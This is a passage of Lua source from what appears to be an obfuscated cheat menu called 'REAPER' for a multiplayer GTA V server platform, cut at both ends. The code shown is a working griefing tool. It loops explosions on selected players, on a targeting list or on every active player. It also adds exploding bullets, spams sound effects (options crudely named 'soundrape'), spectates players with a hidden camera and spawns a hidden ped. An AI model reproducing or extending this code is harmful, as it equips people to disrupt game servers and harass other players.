                        elseif __REAPER1__.V.FreecamMode == 2 and __REAPER1__.N.IsDisabledControlJustReleased(0, 105) then
                            t.cnum = t.cnum == 4 and 1 or t.cnum + 1
                        end
                    elseif __REAPER1__.V.FreecamMode == 6 then
                        if __REAPER1__.N.IsDisabledControlJustReleased(0, 45) then
                            if t.silent then
                                __REAPER1__.N.DeleteEntity(__REAPER1__.V.FreecamSilentPed)
                                __REAPER1__.V.FreecamSilentPed = nil
                                t.silent = false
                            else
                                __REAPER25__(function()
                                    if __REAPER1__.F.RequestEntity(`mp_m_freemode_01`--[[UDP]]) then
                                        __REAPER1__.V.FreecamSilentPed =  __REAPER1__.N.CreatePed(__REAPER1__.N.GetPedType('mp_m_freemode_01'--[[UDP]]), `mp_m_freemode_01`--[[UDP]], 0.0, 0.0, 0.0, 0.0, true, true)
                                        __REAPER1__.N.SilentPedConfig(__REAPER1__.V.FreecamSilentPed)
                                    end
        
                                    t.silent = true
                                end)
                            end
                        elseif __REAPER1__.N.IsDisabledControlJustReleased(0, 23) then
                            t.dnum = t.dnum == 19 and 1 or t.dnum + 1
                        end
                    elseif __REAPER1__.V.FreecamMode == 7 then
                        if __REAPER1__.N.IsDisabledControlJustReleased(0, 45) then
                            t.snum = t.snum == 25 and 1 or t.snum + 1
                        end
                    elseif __REAPER1__.V.FreecamMode == 8 then
                        if __REAPER1__.N.IsDisabledControlJustReleased(0, 45) then
                            t.dnum = t.dnum == 19 and 1 or t.dnum + 1
                        elseif __REAPER1__.N.IsDisabledControlJustReleased(0, 23) then
                            t.audible = not t.audible
                        elseif __REAPER1__.N.IsDisabledControlJustReleased(0, 26) then
                            t.invisible = not t.invisible
                        end
                    end
                    
                    if t.silent then
                        if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.FreecamSilentPed) then
                            local ground, z = __REAPER1__.N.GetGroundZFor_3dCoord(__REAPER1__.V.FreecamC.x, __REAPER1__.V.FreecamC.y, __REAPER1__.V.FreecamC.z)
                            __REAPER1__.N.SetEntityCoordsNoOffset(__REAPER1__.V.FreecamSilentPed, __REAPER1__.V.FreecamC.x, __REAPER1__.V.FreecamC.y, ground and z - 100.0 or __REAPER1__.V.FreecamC.z - 100.0)
                        else
                            __REAPER1__.V.FreecamSilentPed = nil
                            t.silent = false
                        end
                    end

                    if __REAPER1__.V.FreecamMode == 1 then
                        __REAPER1__.V.FreecamText = 'Speed: ' .. __REAPER1__.F.FloatLength(freecamSpeed, 1) .. ' | Button: ' .. (__REAPER1__.V.FreecamButton == __REAPER1__.N.IsDisabledControlPressed and 'Hold' or 'Release')
                    elseif __REAPER1__.V.FreecamMode == 2 then
                        __REAPER1__.V.FreecamText = t.tablem[t.sub].name .. ' | ' .. t.power[t.pnum] .. ' | Cleanup: ' .. (t.cleanup and 'Yes' or 'No') .. ' | Launch: ' .. (t.launch and 'Yes' or 'No') .. ' | Condition: ' .. t.cond[t.cnum]
                    elseif __REAPER1__.V.FreecamMode == 3 or __REAPER1__.V.FreecamMode == 4 or __REAPER1__.V.FreecamMode == 5 then
                        __REAPER1__.V.FreecamText = t.tablem[t.sub].name .. ' | ' .. t.power[t.pnum] .. ' | Cleanup: ' .. (t.cleanup and 'Yes' or 'No') .. ' | Launch: ' .. (t.launch and 'Yes' or 'No')
                    elseif __REAPER1__.V.FreecamMode == 6 then
                        __REAPER1__.V.FreecamText = t.tablem[t.sub].name .. ' | ' .. 'Silent: ' .. (t.silent and 'Yes' or 'No') .. ' | Damage: ' .. t.damage[t.dnum]
                    elseif __REAPER1__.V.FreecamMode == 7 then
                        __REAPER1__.V.FreecamText = t.tablem[t.sub].name .. ' | ' .. 'Size: ' .. t.size[t.snum]
                    elseif __REAPER1__.V.FreecamMode == 8 then
                        __REAPER1__.V.FreecamText = t.tablem[t.sub] .. ' | ' .. 'Damage: ' .. t.damage[t.dnum] .. ' | Audible: ' .. (t.audible and 'Yes' or 'No') .. ' | Invisible: ' .. (t.invisible and 'Yes' or 'No')
                    elseif __REAPER1__.V.FreecamMode == 9 then
                        __REAPER1__.V.FreecamText = __REAPER1__.V.FreecamIgnore and 'Moving' or 'Idle'
                    end
                    
                    __REAPER1__.F.DrawText('~c~[~s~REAPER~c~] Mode: ', 0.5, 0.9, 6, 255, 255, 255, 150, 0.3, true)
                    __REAPER1__.F.DrawText(t.text .. ' | ' .. __REAPER1__.V.FreecamText, 0.5, 0.92, 6, 255, 255, 255, 150, 0.3, true, false, true)
                end

                if __REAPER1__.T.LoopedPlayers[1] then
                    for k,v in ipairs(__REAPER1__.T.LoopedPlayers) do
                        local pid = __REAPER1__.N.GetPlayerFromServerId(v.id)
                        if __REAPER1__.N.NetworkIsPlayerActive(pid) then
                            local ped = __REAPER1__.N.GetPlayerPed(pid)
                            if v.option.spec then
                                local coords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(ped, 0.0, -3.0, 1.5)
                                __REAPER1__.N.DisableAllControlActions(0)

                                __REAPER1__.N.SetCamCoord(__REAPER1__.V.SpectatingCamera, coords)
                                __REAPER1__.N.SetFocusPosAndVel(coords)
                                __REAPER1__.N.BadabingBadaboom(coords.x, coords.y)
                            end
                            if v.option.exploding then
                                __REAPER1__.N.CreateExplosion(__REAPER1__.N.GetEntityCoords(ped), __REAPER1__.A[v.dkey .. '_type'].sindex - 1, __REAPER1__.F.IntToFloat(__REAPER1__.A[v.dkey .. '_damage'].sindex - 1), __REAPER1__.A[v.dkey .. '_audible'].func, __REAPER1__.A[v.dkey .. '_invisible'].func, true)
                            end
                            if v.option.btraced then
                                local ret, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(ped)
                                
                                if ret then
                                    local wepCoords = __REAPER1__.N.WeaponCoords(ped)
                                    local skip = false;
                                    for _k,_v in ipairs(__REAPER1__.T.TracePlayersB) do
                                        if _v.id == v.id then
                                            skip = true
                                            table.insert(__REAPER1__.T.TracePlayersB, {id = v.id, wepCoords = wepCoords, coords = coords, time = __REAPER1__.N.GetGameTimer(), r = _v.r, g = _v.g, b = _v.b})
                                            break
                                        end
                                    end

                                    if not skip then
                                        table.insert(__REAPER1__.T.TracePlayersB, {id = v.id, wepCoords = wepCoords, coords = coords, time = __REAPER1__.N.GetGameTimer(), r = math.random(0, 255), g = math.random(0, 255), b = math.random(0, 255)})
                                    end
                                end
                                for _k,_v in ipairs(__REAPER1__.T.TracePlayersB) do
                                    if __REAPER1__.N.GetGameTimer() - _v.time < __REAPER1__.A[v.dkey .. '_tracebullets'].sindex * 10 then
                                        __REAPER1__.N.DrawLine(_v.wepCoords, _v.coords, _v.r, _v.g, _v.b, 255)
                                    else
                                        table.remove(__REAPER1__.T.TracePlayersB, k)
                                    end
                                end
                            end
                            if v.option.itraced then
                                local ret, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(ped)

                                if ret then
                                    local skip = false;
                                    for _k,_v in ipairs(__REAPER1__.T.TracePlayersI) do
                                        if _v.id == v.id then
                                            skip = true
                                            table.insert(__REAPER1__.T.TracePlayersI, {id = v.id, coords = coords, time = __REAPER1__.N.GetGameTimer(), r = _v.r, g = _v.g, b = _v.b})
                                            break
                                        end
                                    end

                                    if not skip then
                                        table.insert(__REAPER1__.T.TracePlayersI, {id = v.id, coords = coords, time = __REAPER1__.N.GetGameTimer(), r = math.random(0, 255), g = math.random(0, 255), b = math.random(0, 255)})
                                    end
                                end
                                for _k,_v in ipairs(__REAPER1__.T.TracePlayersI) do
                                    if __REAPER1__.N.GetGameTimer() - _v.time < __REAPER1__.A[v.dkey .. '_traceimpacts'].sindex * 10 then
                                        __REAPER1__.N.DrawMarker(28, _v.coords.x, _v.coords.y, _v.coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.08, 0.08, 0.08, _v.r, _v.g, _v.b, 255, false, 1, 2, nil, nil, nil, false)
                                    else
                                        table.remove(__REAPER1__.T.TracePlayersI, k)
                                    end
                                end
                            end
                            if v.option.cartoon and __REAPER1__.N.IsPedShooting(ped) then
                                local coords = __REAPER1__.N.WeaponCoords(ped)
                                __REAPER1__.N.DoParticle('scr_rcbarry2', 'muz_clown', coords.x, coords.y, coords.z, 1.0, 0, 0, 0, 0, 0, 0)
                            end
                            if v.option.explodingbullets then
                                local impact, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(ped)
                                if impact then
                                    __REAPER1__.N.CreateExplosion(coords, 7, __REAPER1__.F.IntToFloat(__REAPER1__.A[v.dkey .. '_damage'].sindex - 1), __REAPER1__.A[v.dkey .. '_audible'].func, __REAPER1__.A[v.dkey .. '_invisible'].func, 0)
                                end
                            end
                            if v.option.particle and __REAPER1__.N.GetGameTimer() > (__REAPER1__.V.ParticleServerDelay or 0) then
                                __REAPER1__.V.ParticleServerDelay = __REAPER1__.N.GetGameTimer() + __REAPER1__.A[v.dkey .. '_delay'].sindex - 1
                                local coords = __REAPER1__.N.GetEntityCoords(ped)
                                local rx, ry, rz = __REAPER1__.F.AdvStringSplit(3, __REAPER1__.A[v.dkey .. '_rotation'].func, ' ', true)
                                local ax, ay, az = __REAPER1__.F.AdvStringSplit(3, __REAPER1__.A[v.dkey .. '_axis'].func, ' ', true)
                                __REAPER1__.N.DoParticle(__REAPER1__.T.ParticleEffects[__REAPER1__.A[v.dkey .. '_type'].sindex].dict, __REAPER1__.T.ParticleEffects[__REAPER1__.A[v.dkey .. '_type'].sindex].name, coords.x, coords.y, coords.z, __REAPER1__.F.IntToFloat(__REAPER1__.A[v.dkey .. '_scale'].sindex), rx, ry, rz, ax, ay, az)
                            end
                            if v.option.sound and __REAPER1__.N.GetGameTimer() > (__REAPER1__.V.SoundServerDelay or 0) then
                                __REAPER1__.V.SoundServerDelay = __REAPER1__.N.GetGameTimer() + (__REAPER1__.A[v.dkey .. '_delay'].sindex - 1) * 10
                                local c = __REAPER1__.N.GetEntityCoords(ped)
                                __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[__REAPER1__.A[v.dkey .. '_type'].sindex].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[__REAPER1__.A[v.dkey .. '_type'].sindex].dict, true, 1.0, true)
                            end
                            if v.option.soundr and __REAPER1__.N.GetGameTimer() > (__REAPER1__.V.SoundServerDelay or 0) then
                                __REAPER1__.V.SoundServerDelay = __REAPER1__.N.GetGameTimer() + (__REAPER1__.A[v.dkey .. '_delay'].sindex - 1) * 10
                                local c = __REAPER1__.N.GetEntityCoords(ped)
                                local RandomN1, RandomN2, RandomN3, RandomN4, RandomN5, RandomN6 = math.random(22), math.random(22), math.random(22), math.random(22), math.random(22), math.random(22)
                                __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN1].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN1].dict, true, 1.0, true)
                                __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN2].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN2].dict, true, 1.0, true)
                                __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN3].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN3].dict, true, 1.0, true)
                                __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN4].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN4].dict, true, 1.0, true)
                                __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN5].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN5].dict, true, 1.0, true)
                                __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN6].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN6].dict, true, 1.0, true)
                            end
                            if v.option.soundr2 and __REAPER1__.N.GetGameTimer() > (__REAPER1__.V.SoundServerDelay or 0) then
                                __REAPER1__.V.SoundServerDelay = __REAPER1__.N.GetGameTimer() + (__REAPER1__.A[v.dkey .. '_delay'].sindex - 1) * 10
                                local c = __REAPER1__.N.GetEntityCoords(ped)
                                __REAPER1__.N.CreateExplosion(c.x, c.y, c.z - 10.0, math.random(0,34), 0, true, true, 0)
                                __REAPER1__.N.CreateExplosion(c.x, c.y, c.z - 10.0, math.random(0,34), 0, true, true, 0)
                                __REAPER1__.N.CreateExplosion(c.x, c.y, c.z - 10.0, math.random(0,34), 0, true, true, 0)
                                __REAPER1__.N.CreateExplosion(c.x, c.y, c.z - 10.0, math.random(0,34), 0, true, true, 0)
                            end
                        else
                            __REAPER1__.F.AddNotification('Player left: ' .. __REAPER1__.N.GetPlayerName(v.id), 8000, 255, 0, 0)
                            if v.option.spec and __REAPER1__.N.DoesCamExist(__REAPER1__.V.SpectatingCamera) then
                                __REAPER1__.N.SpectatingCam(false)
                            end
                            table.remove(__REAPER1__.T.LoopedPlayers, k)
                        end
                    end
                end

                if __REAPER1__.A['server:allplayers:explosion_loopexplode'].func then
                    __REAPER1__.M.aplayers.explosion.explode()
                end

                if __REAPER1__.A['server:allplayers:sound_loopsound'].func and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.SoundsNormalDelay or 0) then
                    __REAPER1__.V.SoundsNormalDelay = __REAPER1__.N.GetGameTimer() + (__REAPER1__.A['server:allplayers:sound_delay'].sindex - 1) * 10
                    __REAPER1__.M.aplayers.sound.sound()
                end

                if __REAPER1__.A['server:allplayers:sound_soundrape'].func then
                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                            local c = __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(v))
                            local RandomN1, RandomN2, RandomN3, RandomN4, RandomN5, RandomN6 = math.random(22), math.random(22), math.random(22), math.random(22), math.random(22), math.random(22)
                            __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN1].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN1].dict, true, 1.0, true)
                            __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN2].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN2].dict, true, 1.0, true)
                            __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN3].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN3].dict, true, 1.0, true)
                            __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN4].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN4].dict, true, 1.0, true)
                            __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN5].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN5].dict, true, 1.0, true)
                            __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN6].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN6].dict, true, 1.0, true)
                        end
                    end
                end

                if __REAPER1__.A['server:allplayers:sound_soundrape2'].func then
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                            if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                                local c = __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(v))
                                __REAPER1__.N.CreateExplosion(c.x, c.y, c.z - 10.0, math.random(0,34), 0, true, true, 0)
                                __REAPER1__.N.CreateExplosion(c.x, c.y, c.z - 10.0, math.random(0,34), 0, true, true, 0)
                                __REAPER1__.N.CreateExplosion(c.x, c.y, c.z - 10.0, math.random(0,34), 0, true, true, 0)
                                __REAPER1__.N.CreateExplosion(c.x, c.y, c.z - 10.0, math.random(0,34), 0, true, true, 0)
                            end

                            __REAPER26__(5)
                        end
                    end)
                end

                if __REAPER1__.A['server:allplayers:particle_loopparticle'].func and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.ParticleServerDelay or 0) then
                    __REAPER1__.V.ParticleServerDelay = __REAPER1__.N.GetGameTimer() + (__REAPER1__.A['server:allplayers:particle_delay'].sindex - 1) * 10
                    __REAPER1__.M.aplayers.particle.play()
                end

                if __REAPER1__.A['server:allplayers:weapon_explode'].func then
                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        local ped = __REAPER1__.N.GetPlayerPed(v)
                        if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                            local impact, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(ped)
                            if impact then
                                __REAPER1__.N.CreateExplosion(coords, 7, __REAPER1__.F.IntToFloat(__REAPER1__.A['server:allplayers:weapon_damage'].sindex - 1), __REAPER1__.A['server:allplayers:weapon_audible'].func, __REAPER1__.A['server:allplayers:weapon_invisible'].func, 0)
                            end
                        end
                    end
                end

                if __REAPER1__.A['server:allplayers:weapon_tracebullets'].toggle or __REAPER1__.A['server:allplayers:weapon_traceimpacts'].toggle then
                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        if not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func then
                            local id = __REAPER1__.N.GetPlayerServerId(v)
                            local ped = __REAPER1__.N.GetPlayerPed(v)
                            local ret, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(ped)

                            if __REAPER1__.A['server:allplayers:weapon_tracebullets'].toggle then
                                if ret then
                                    local wepCoords = __REAPER1__.N.WeaponCoords(ped)
                                    local skip = false;
                                    for _k,_v in ipairs(__REAPER1__.T.AllPlysTracerB) do
                                        if _v.id == id then
                                            skip = true
                                            table.insert(__REAPER1__.T.AllPlysTracerB, {id = id, wepCoords = wepCoords, coords = coords, time = __REAPER1__.N.GetGameTimer(), r = _v.r, g = _v.g, b = _v.b})
                                            break
                                        end
                                    end

                                    if not skip then
                                        table.insert(__REAPER1__.T.AllPlysTracerB, {id = id, wepCoords = wepCoords, coords = coords, time = __REAPER1__.N.GetGameTimer(), r = math.random(0, 255), g = math.random(0, 255), b = math.random(0, 255)})
                                    end
                                end
                                for _k,_v in ipairs(__REAPER1__.T.AllPlysTracerB) do
                                    if __REAPER1__.N.GetGameTimer() - _v.time < __REAPER1__.A['server:allplayers:weapon_tracebullets'].sindex * 10 then
                                        __REAPER1__.N.DrawLine(_v.wepCoords, _v.coords, _v.r, _v.g, _v.b, 255)
                                    else
                                        table.remove(__REAPER1__.T.AllPlysTracerB, k)
                                    end
                                end
                            end

                            if __REAPER1__.A['server:allplayers:weapon_traceimpacts'].toggle then
                                if ret then
                                    local skip = false;
                                    for _k,_v in ipairs(__REAPER1__.T.AllPlysTracerI) do
                                        if _v.id == id then
                                            skip = true
                                            table.insert(__REAPER1__.T.AllPlysTracerI, {id = id, coords = coords, time = __REAPER1__.N.GetGameTimer(), r = _v.r, g = _v.g, b = _v.b})
                                            break
                                        end
                                    end

                                    if not skip then
                                        table.insert(__REAPER1__.T.AllPlysTracerI, {id = id, coords = coords, time = __REAPER1__.N.GetGameTimer(), r = math.random(0, 255), g = math.random(0, 255), b = math.random(0, 255)})
                                    end
                                end
                                for _k,_v in ipairs(__REAPER1__.T.AllPlysTracerI) do
                                    if __REAPER1__.N.GetGameTimer() - _v.time < __REAPER1__.A['server:allplayers:weapon_traceimpacts'].sindex * 10 then
                                        __REAPER1__.N.DrawMarker(28, _v.coords.x, _v.coords.y, _v.coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.08, 0.08, 0.08, _v.r, _v.g, _v.b, 255, false, 1, 2, nil, nil, nil, false)
                                    else
                                        table.remove(__REAPER1__.T.AllPlysTracerI, k)
                                    end
                                end
                            end
                        end
                    end
                end

                if __REAPER1__.A['server:allplayers:weapon_cartoongun'].func then
                    for k,v in pairs(__REAPER1__.N.GetActivePlayers()) do
                        local ped = __REAPER1__.N.GetPlayerPed(v)
                        if __REAPER1__.N.IsPedShooting(ped) and (not __REAPER1__.A['server:allplayers_includeself'].func and v ~= __REAPER1__.V.SelfPlayerId or __REAPER1__.A['server:allplayers_includeself'].func) then
                            local coords = __REAPER1__.N.WeaponCoords(ped)
                            __REAPER1__.N.DoParticle('scr_rcbarry2', 'muz_clown', coords.x, coords.y, coords.z, 1.0, 0, 0, 0, 0, 0, 0)
                        end
                    end
                end

                if __REAPER1__.A['server:targetinglist:explosion_loopexplode'].func then
                    __REAPER1__.M.tlist.explosion.explode()
                end
                
                if __REAPER1__.A['server:targetinglist:sound_loopsound'].func and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.SoundsTargetDelay or 0) then
                    __REAPER1__.V.SoundsTargetDelay = __REAPER1__.N.GetGameTimer() + (__REAPER1__.A['server:targetinglist:sound_delay'].sindex - 1) * 10
                    __REAPER1__.M.tlist.sound.sound()
                end
                
                if __REAPER1__.A['server:targetinglist:sound_soundrape'].func then
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        local c = __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra)))
                        local RandomN1, RandomN2, RandomN3, RandomN4, RandomN5, RandomN6 = math.random(22), math.random(22), math.random(22), math.random(22), math.random(22), math.random(22)
                        __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN1].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN1].dict, true, 1.0, true)
                        __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN2].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN2].dict, true, 1.0, true)
                        __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN3].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN3].dict, true, 1.0, true)
                        __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN4].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN4].dict, true, 1.0, true)
                        __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN5].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN5].dict, true, 1.0, true)
                        __REAPER1__.N.PlaySoundFromCoord(-1, __REAPER1__.T.SoundTrollSounds[RandomN6].name, c.x, c.y, c.z, __REAPER1__.T.SoundTrollSounds[RandomN6].dict, true, 1.0, true)
                    end
                end
                
                if __REAPER1__.A['server:targetinglist:sound_soundrape2'].func then
                    __REAPER25__(function()
                        for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                            local c = __REAPER1__.N.GetEntityCoords(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra)))
                            __REAPER1__.N.CreateExplosion(c.x, c.y, c.z, math.random(0,34), 0, true, true, 0)
                            __REAPER1__.N.CreateExplosion(c.x, c.y, c.z, math.random(0,34), 0, true, true, 0)
                            __REAPER1__.N.CreateExplosion(c.x, c.y, c.z, math.random(0,34), 0, true, true, 0)
                            __REAPER1__.N.CreateExplosion(c.x, c.y, c.z, math.random(0,34), 0, true, true, 0)
                
                            __REAPER26__(5)
                        end
                    end)
                end
                
                if __REAPER1__.A['server:targetinglist:particle_loopparticle'].func and __REAPER1__.N.GetGameTimer() >= (__REAPER1__.V.ParticleServerDelay or 0) then
                    __REAPER1__.V.ParticleServerDelay = __REAPER1__.N.GetGameTimer() + (__REAPER1__.A['server:targetinglist:particle_delay'].sindex - 1) * 10
                    __REAPER1__.M.tlist.particle.play()
                end
                
                if __REAPER1__.A['server:targetinglist:weapon_explode'].func then
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        local impact, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(__REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra)))
                        if impact then
                            __REAPER1__.N.CreateExplosion(coords, 7, __REAPER1__.F.IntToFloat(__REAPER1__.A['server:targetinglist:weapon_damage'].sindex - 1), __REAPER1__.A['server:targetinglist:weapon_audible'].func, __REAPER1__.A['server:targetinglist:weapon_invisible'].func, 0)
                        end
                    end
                end

                if __REAPER1__.A['server:targetinglist:weapon_tracebullets'].toggle or __REAPER1__.A['server:targetinglist:weapon_traceimpacts'].toggle then
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                        local ret, coords = __REAPER1__.N.GetPedLastWeaponImpactCoord(ped)

                        if __REAPER1__.A['server:targetinglist:weapon_tracebullets'].toggle then
                            if ret then
                                local wepCoords = __REAPER1__.N.WeaponCoords(ped)
                                local skip = false;
                                for _k,_v in ipairs(__REAPER1__.T.TlistPlysTracerB) do
                                    if _v.id == v.extra then
                                        skip = true
                                        table.insert(__REAPER1__.T.TlistPlysTracerB, {id = v.extra, wepCoords = wepCoords, coords = coords, time = __REAPER1__.N.GetGameTimer(), r = _v.r, g = _v.g, b = _v.b})
                                        break
                                    end
                                end

                                if not skip then
                                    table.insert(__REAPER1__.T.TlistPlysTracerB, {id = v.extra, wepCoords = wepCoords, coords = coords, time = __REAPER1__.N.GetGameTimer(), r = math.random(0, 255), g = math.random(0, 255), b = math.random(0, 255)})
                                end
                            end
                            for _k,_v in ipairs(__REAPER1__.T.TlistPlysTracerB) do
                                if __REAPER1__.N.GetGameTimer() - _v.time < __REAPER1__.A['server:targetinglist:weapon_tracebullets'].sindex * 10 then
                                    __REAPER1__.N.DrawLine(_v.wepCoords, _v.coords, _v.r, _v.g, _v.b, 255)
                                else
                                    table.remove(__REAPER1__.T.TlistPlysTracerB, k)
                                end
                            end
                        end

                        if __REAPER1__.A['server:targetinglist:weapon_traceimpacts'].toggle then
                            if ret then
                                local skip = false;
                                for _k,_v in ipairs(__REAPER1__.T.TlistPlysTracerI) do
                                    if _v.id == v.extra then
                                        skip = true
                                        table.insert(__REAPER1__.T.TlistPlysTracerI, {id = v.extra, coords = coords, time = __REAPER1__.N.GetGameTimer(), r = _v.r, g = _v.g, b = _v.b})
                                        break
                                    end
                                end

                                if not skip then
                                    table.insert(__REAPER1__.T.TlistPlysTracerI, {id = v.extra, coords = coords, time = __REAPER1__.N.GetGameTimer(), r = math.random(0, 255), g = math.random(0, 255), b = math.random(0, 255)})
                                end
                            end
                            for _k,_v in ipairs(__REAPER1__.T.TlistPlysTracerI) do
                                if __REAPER1__.N.GetGameTimer() - _v.time < __REAPER1__.A['server:targetinglist:weapon_traceimpacts'].sindex * 10 then
                                    __REAPER1__.N.DrawMarker(28, _v.coords.x, _v.coords.y, _v.coords.z, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 0.08, 0.08, 0.08, _v.r, _v.g, _v.b, 255, false, 1, 2, nil, nil, nil, false)
                                else
                                    table.remove(__REAPER1__.T.TlistPlysTracerI, k)
                                end
                            end
                        end
                    end
                end

                if __REAPER1__.A['server:targetinglist:weapon_cartoongun'].func then
                    for k,v in pairs(__REAPER1__.T.Display['server:targetinglist:targetedplayers']) do
                        local ped = __REAPER1__.N.GetPlayerPed(__REAPER1__.N.GetPlayerFromServerId(v.extra))
                        local coords = __REAPER1__.N.WeaponCoords(ped)
                        __REAPER1__.N.DoParticle('scr_rcbarry2', 'muz_clown', coords.x, coords.y, coords.z, 1.0, 0, 0, 0, 0, 0, 0)
                    end
                end

                if __REAPER1__.A['misc:rccar_rccar'].func and __REAPER1__.N.DoesEntityExist(__REAPER1__.V.Rcbandito) and __REAPER1__.N.DoesCamExist(__REAPER1__.V.Rccam) then
                    if __REAPER1__.N.DoesEntityExist(__REAPER1__.V.RccarDriver) then
                        __REAPER1__.N.DisableAllControlActions(0)
                        __REAPER1__.N.ApplyForceToEntity(__REAPER1__.V.Rcbandito, 1, 0, 0, -1.0, 0, 0, 0, 1, true, true, true, true, true)
                        __REAPER1__.N.SetVehicleCheatPowerIncrease(__REAPER1__.V.Rcbandito, 5.0)

                        local coords = __REAPER1__.N.GetOffsetFromEntityInWorldCoords(__REAPER1__.V.Rcbandito, 0, -10.0, 5.0)
                        __REAPER1__.N.SetCamCoord(__REAPER1__.V.Rccam, coords)
                        __REAPER1__.N.SetFocusPosAndVel(coords, 0, 0, 0)

                        if __REAPER1__.N.IsDisabledControlPressed(0, 129) and not __REAPER1__.N.IsDisabledControlPressed(0, 130) then
                            __REAPER1__.N.TaskVehicleTempAction(__REAPER1__.V.RccarDriver, __REAPER1__.V.Rcbandito, 9, 1)
                        end
                        
                        if __REAPER1__.N.IsDisabledControlJustReleased(0, 129) or __REAPER1__.N.IsDisabledControlJustReleased(0, 130) then
                            __REAPER1__.N.TaskVehicleTempAction(__REAPER1__.V.RccarDriver, __REAPER1__.V.Rcbandito, 6, 2500)
                        end
                        
                        if __REAPER1__.N.IsDisabledControlPressed(0, 130) and not __REAPER1__.N.IsDisabledControlPressed(0, 129) then
                            __REAPER1__.N.TaskVehicleTempAction(__REAPER1__.V.RccarDriver, __REAPER1__.V.Rcbandito, 22, 1)
                        end
                        
